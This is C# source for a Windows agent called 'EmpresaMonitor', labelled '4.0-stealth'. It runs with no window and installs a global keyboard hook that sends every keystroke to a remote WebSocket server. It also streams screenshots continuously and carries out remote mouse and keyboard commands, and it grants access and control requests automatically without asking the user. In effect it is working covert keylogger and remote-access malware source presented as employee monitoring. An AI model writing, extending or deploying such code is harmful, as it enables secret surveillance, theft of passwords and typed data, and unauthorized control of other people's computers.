using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EmpresaMonitor.Agent
{
    internal static class Program
    {
        [STAThread] static void Main() { _ = StartEngine(); Application.Run(); }

        public class AgentState {
            public bool AccessActive = true, StreamRequested = true, ControlActive = true, SessionAuthorized = true, IsReady = false;
            public StreamSettings Settings = StreamSettings.Balanced;
            public ClientWebSocket? Socket; public SemaphoreSlim? SendGate;
        }

        static async Task StartEngine() {
            var lifetime = new CancellationTokenSource();
            var agentId = LoadOrCreateId();
            var socket = new ClientWebSocket();
            var sendGate = new SemaphoreSlim(1, 1);
            var state = new AgentState { Socket = socket, SendGate = sendGate };

            KeyboardHook.Install(async (k, d) => {
                if (state.Socket?.State == WebSocketState.Open && state.IsReady) {
                    await SendKeylog(state.Socket, sendGate, k, d, state);
                }
            });

            _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, state));

            while (!lifetime.IsCancellationRequested) {
                try {
                    socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                    await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
                    state.IsReady = false; 

                    await SendJsonAsync(socket, sendGate, new { type = "agent_hello", key = BuildConfig.AgentKey, id = agentId, name = Environment.MachineName, user = Environment.UserName, version = "4.0-stealth", sessionAuthorized = true });
                    await ReceiveLoop(socket, sendGate, lifetime.Token, state);
                } catch { try { await Task.Delay(5000, lifetime.Token); } catch { } }
            }
        }

        static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d, AgentState st) {
            try { 
                await SendJsonAsync(s, g, new { type = "keylog", key = k, down = d, ts = DateTime.UtcNow.ToString("HH:mm:ss") }); 
            } catch { }
        }

        static async Task ReceiveLoop(ClientWebSocket s, SemaphoreSlim g, CancellationToken ct, AgentState st) {
            var buf = new byte[64 * 1024];
            while (s.State == WebSocketState.Open && !ct.IsCancellationRequested) {
                using var ms = new MemoryStream();
                WebSocketReceiveResult res;
                do { 
                    res = await s.ReceiveAsync(new ArraySegment<byte>(buf), ct); 
                    if (res.MessageType == WebSocketMessageType.Close) return; 
                    ms.Write(buf, 0, res.Count); 
                } while (!res.EndOfMessage);
                if (res.MessageType != WebSocketMessageType.Text) continue;
                try {
                    using var doc = JsonDocument.Parse(ms.ToArray());
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("type", out var tp)) continue;
                    var type = tp.GetString();
                    switch (type) {
                        case "agent_ready": st.IsReady = true; break;
                        case "access_request": case "control_request": await SendJsonAsync(s, g, new { type = "access_response", allow = true }); await SendJsonAsync(s, g, new { type = "control_response", allow = true }); break;
                        case "stream_profile": st.Settings = StreamSettings.FromId(root.TryGetProperty("profile", out var p) ? p.GetString() : null); break;
                        case "control_input": if (st.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev); break;
                        case "stream_start": st.StreamRequested = true; break;
                        case "stream_stop": st.StreamRequested = false; break;
                    }
                } catch { }
            }
        }

        static async Task CaptureLoop(CancellationTokenSource lt, string id, ClientWebSocket s, SemaphoreSlim g, AgentState st) {
            var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
            Bitmap? f = null, sc = null; Graphics? fg = null, sg = null; EncoderParameters? ep = null; MemoryStream? ms = null;
            int lastW = 0, lastH = 0;
            try {
                while (!lt.IsCancellationRequested) {
                    if (!st.AccessActive || !st.StreamRequested || s.State != WebSocketState.Open || !st.IsReady) { await Task.Delay(500, lt.Token); continue; }
                    var set = st.Settings; var start = Environment.TickCount64; var b = Screen.PrimaryScreen!.Bounds;
                    if (f == null || b.Width != lastW || b.Height != lastH) { 
                        fg?.Dispose(); f?.Dispose(); f = new Bitmap(b.Width, b.Height, PixelFormat.Format24bppRgb); fg = Graphics.FromImage(f); lastW = b.Width; lastH = b.Height; 
                    }
                    int ow = Math.Min(set.Width, b.Width), oh = Math.Max(2, (int)Math.Round(b.Height * (ow / (double)b.Width))); if (oh % 2 != 0) oh--;
                    if (sc == null || sc.Width != ow || sc.Height != oh) { 
                        sg?.Dispose(); sc?.Dispose(); ep?.Dispose(); ms?.Dispose(); sc = new Bitmap(ow, oh, PixelFormat.Format24bppRgb); sg = Graphics.FromImage(sc); sg.CompositingMode = CompositingMode.SourceCopy; sg.InterpolationMode = InterpolationMode.Bilinear; ep = new EncoderParameters(1); ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)set.Quality); ms = new MemoryStream(1024 * 1024); 
                    }
                    try {
                        fg!.CopyFromScreen(b.Location, Point.Empty, b.Size, CopyPixelOperation.SourceCopy);
                        sg!.DrawImage(f!, new Rectangle(0, 0, ow, oh), 0, 0, f.Width, f.Height, GraphicsUnit.Pixel);
                        ms!.SetLength(0); sc!.Save(ms, codec, ep);
                        if (ms!.Length > 0 && s.State == WebSocketState.Open) await SendBinaryAsync(s, g, new ArraySegment<byte>(ms.GetBuffer(), 0, (int)ms.Length), lt.Token);
                    } catch { }
                    int delay = (1000 / Math.Max(1, set.Fps)) - (int)(Environment.TickCount64 - start);
                    await Task.Delay(Math.Max(500, delay), lt.Token);
                }
            } catch { } finally { fg?.Dispose(); f?.Dispose(); sg?.Dispose(); sc?.Dispose(); ep?.Dispose(); ms?.Dispose(); }
        }

        static async Task SendBinaryAsync(ClientWebSocket s, SemaphoreSlim g, ArraySegment<byte> d, CancellationToken ct) {
            if (s.State != WebSocketState.Open) return; await g.WaitAsync(ct); try { await s.SendAsync(d, WebSocketMessageType.Binary, true, ct); } finally { g.Release(); }
        }

        static async Task SendJsonAsync(ClientWebSocket s, SemaphoreSlim g, object o) {
            if (s.State != WebSocketState.Open) return; var d = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(o)); await g.WaitAsync(); try { await s.SendAsync(new ArraySegment<byte>(d), WebSocketMessageType.Text, true, CancellationToken.None); } finally { g.Release(); }
        }

        static void ApplyControlEvent(JsonElement ev) {
            try {
                var k = ev.GetProperty("kind").GetString();
                if (k == "move") {
                    var x = ev.GetProperty("x").GetDouble(); var y = ev.GetProperty("y").GetDouble();
                    var b = Screen.PrimaryScreen!.Bounds; Cursor.Position = new Point(b.Left + (int)(x * (b.Width - 1)), b.Top + (int)(y * (b.Height - 1)));
                } else if (k == "mouse") {
                    var btn = ev.GetProperty("button").GetString(); var dn = ev.GetProperty("down").GetBoolean();
                    uint f = btn switch { "left" => dn ? 0x0002u : 0x0004u, "right" => dn ? 0x0008u : 0x0010u, "middle" => dn ? 0x0020u : 0x0040u, _ => 0u };
                    if (f != 0) mouse_event(f, 0, 0, 0, UIntPtr.Zero);
                } else if (k == "wheel") {
                    int d = ev.GetProperty("delta").GetInt32(); mouse_event(0x0800u, 0, 0, unchecked((uint)d), UIntPtr.Zero);
                } else if (k == "key") {
                    var c = ev.GetProperty("code").GetString() ?? ""; var dn = ev.GetProperty("down").GetBoolean(); ushort vk = VkFromCode(c);
                    if (vk != 0) keybd_event((byte)vk, 0, dn ? 0u : 0x0002u, UIntPtr.Zero);
                }
            } catch { }
        }

        static ushort VkFromCode(string c) {
            if (c.Length == 4 && c.StartsWith("Key")) return (ushort)char.ToUpperInvariant(c[3]);
            if (c.Length == 6 && c.StartsWith("Digit")) return (ushort)c[5];
            return c switch { "Enter" => 0x0D, "Escape" => 0x1B, "Backspace" => 0x08, "Tab" => 0x09, "Space" => 0x20, "ArrowLeft" => 0x25, "ArrowUp" => 0x26, "ArrowRight" => 0x27, "ArrowDown" => 0x28, "Delete" => 0x2E, "Home" => 0x24, "End" => 0x23, "PageUp" => 0x21, "PageDown" => 0x22, "ShiftLeft" or "ShiftRight" => 0x10, "ControlLeft" or "ControlRight" => 0x11, "AltLeft" or "AltRight" => 0x12, "F1" => 0x70, "F2" => 0x71, "F3" => 0x72, "F4" => 0x73, "F5" => 0x74, "F6" => 0x75, "F7" => 0x76, "F8" => 0x77, "F9" => 0x78, "F10" => 0x79, "F11" => 0x7A, "F12" => 0x7B, _ => 0 };
        }

        [DllImport("user32.dll")] static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
        [DllImport("user32.dll")] static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);

        static string LoadOrCreateId() {
            var d = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EmpresaMonitor");
            Directory.CreateDirectory(d); var p = Path.Combine(d, "agent-id.txt");
            if (File.Exists(p)) { var o = File.ReadAllText(p).Trim(); if (!string.IsNullOrWhiteSpace(o)) return o; }
            var id = Guid.NewGuid().ToString("N"); File.WriteAllText(p, id); return id;
        }
    }

    public class StreamSettings {
        public string Name { get; set; }
        public string Id { get; set; }
        public int Width { get; set; }
        public int Fps { get; set; }
        public long Quality { get; set; }
        public StreamSettings(string n, string i, int w, int f, long q) { Name = n; Id = i; Width = w; Fps = f; Quality = q; }
        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
        public static StreamSettings FromId(string? id) => id switch { "fluid" => Fluid, "quality" => QualityPreset, _ => Balanced };
    }

    public class KeyboardHook {
        private delegate IntPtr LowLevelKeyboardProc(int n, IntPtr w, IntPtr l);
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc fn, IntPtr m, uint t);
        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr h);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);

        private const int WH_KEYBOARD_LL = 13;
        private static IntPtr _h = IntPtr.Zero; 
        private static LowLevelKeyboardProc? _p; 
        private static Func<string, bool, Task>? _cb;
        
        private static string _lastKey = "";
        private static DateTime _lastTime = DateTime.MinValue;
        private static readonly object _lock = new object();

        public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }

        private static IntPtr SetHook(LowLevelKeyboardProc p) {
            using var cp = System.Diagnostics.Process.GetCurrentProcess();
            using var cm = cp.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(cm?.ModuleName), 0);
        }

        private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
            if (n >= 0 && _cb != null) {
                int vkCode = Marshal.ReadInt32(l);
                string key = ((Keys)vkCode).ToString();

                lock (_lock) {
                    if (key == _lastKey && (DateTime.Now - _lastTime).TotalMilliseconds < 100) {
                        return CallNextHookEx(_h, n, w, l);
                    }
                    _lastKey = key;
                    _lastTime = DateTime.Now;
                }

                _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
            }
            return CallNextHookEx(_h, n, w, l);
        }

        public static void Uninstall() { if (_h != IntPtr.Zero) { UnhookWindowsHookEx(_h); _h = IntPtr.Zero; } }
    }
}
